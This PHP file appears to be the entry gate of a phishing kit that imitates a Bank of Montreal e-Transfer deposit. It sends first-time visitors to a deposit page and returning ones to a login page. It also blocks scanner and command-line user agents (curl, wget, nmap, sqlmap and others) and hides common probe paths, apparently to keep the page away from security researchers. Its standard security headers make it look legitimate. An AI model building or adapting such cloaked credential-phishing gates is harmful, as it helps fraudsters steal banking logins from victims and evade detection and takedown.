<?php
declare(strict_types=1);
session_start();

/* ---------------- CONFIGURATION ---------------- */
$pageKey = 'bmo'; // Unique page key, change as necessary
$first_visit_url = 'deposit.php'; // First visit redirect URL
$return_url = 'login.php'; // Second visit redirect URL
$expiry_seconds = 86400 * 30; // Cookie expiry time (30 days)

/* ---------------- COOKIE SETTINGS ---------------- */
$cookie_name = 'etransfer_first_seen_' . preg_replace('/[^A-Za-z0-9_]/', '', $pageKey); // Sanitized cookie name

/* ---------------- CACHE CONTROL ---------------- */
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT'); // Ensures no caching

/* ---------------- FORCE HTTPS ---------------- */
$isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

// Redirect to HTTPS if not already on HTTPS and not in CLI mode
if (!$isHttps && php_sapi_name() !== 'cli') {
    header('Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], true, 301);
    exit;
}

/* ---------------- SECURITY HEADERS ---------------- */

// HTTP Strict Transport Security (HSTS) - Enforces HTTPS for all future requests
header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');

// Prevent MIME type sniffing (X-Content-Type-Options)
header('X-Content-Type-Options: nosniff');

// Prevent clickjacking attacks (X-Frame-Options)
header('X-Frame-Options: SAMEORIGIN');

// Cross-site scripting (XSS) protection (X-XSS-Protection)
header('X-XSS-Protection: 1; mode=block');

// Content Security Policy (CSP) - Restrict sources of content (you can expand this based on your needs)
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';");

// Referrer Policy (Prevents sending referer headers in some cases)
header('Referrer-Policy: no-referrer-when-downgrade');

// Permissions Policy (formerly Feature-Policy) - Controls access to features like Geolocation, Camera, etc.
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");

/* ---------------- ANTI BOT / SCANNER BLOCK ---------------- */
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); // Get user agent and make it lowercase
$blockedAgents = ['curl', 'wget', 'python', 'java', 'go-http', 'httpclient', 'nmap', 'nikto', 'sqlmap', 'dirbuster', 'scanner', 'fuzzer', 'spider', 'bot'];

foreach ($blockedAgents as $blocked) {
    if (strpos($ua, $blocked) !== false) {
        http_response_code(403); // Forbidden response for blocked agents
        exit;
    }
}

/* ---------------- BLOCK SENSITIVE PATHS ---------------- */
$uri = strtolower($_SERVER['REQUEST_URI'] ?? ''); // Get the request URI and make it lowercase
$blockedPaths = ['.env', '.git', 'wp-admin', 'wp-login', 'phpinfo', 'backup', 'dump', 'sql', 'config'];

foreach ($blockedPaths as $blocked) {
    if (strpos($uri, $blocked) !== false) {
        http_response_code(404); // Not Found response for blocked paths
        exit;
    }
}

/* ---------------- HANDLE FIRST VISIT ---------------- */
if (!isset($_COOKIE[$cookie_name])) {
    // Set a cookie to track first-time visits, using a hash of the user agent and IP address for uniqueness
    setcookie(
        $cookie_name,
        hash('sha256', ($ua ?: 'ua') . ($_SERVER['REMOTE_ADDR'] ?? 'ip')), // Hash user agent and IP
        [
            'expires'  => time() + $expiry_seconds,
            'path'     => '/', // Available across the entire site
            'secure'   => $isHttps, // Set secure flag for HTTPS
            'httponly' => true, // Accessible only via HTTP, not JavaScript
            'samesite' => 'Lax' // Cross-site cookie restrictions
        ]
    );
    // Redirect to the first visit URL
    header("Location: $first_visit_url", true, 302);
    exit;
}

/* ---------------- HANDLE SECOND VISIT ---------------- */
header("Location: $return_url", true, 302); // Redirect to login page for second-time visitors
exit;
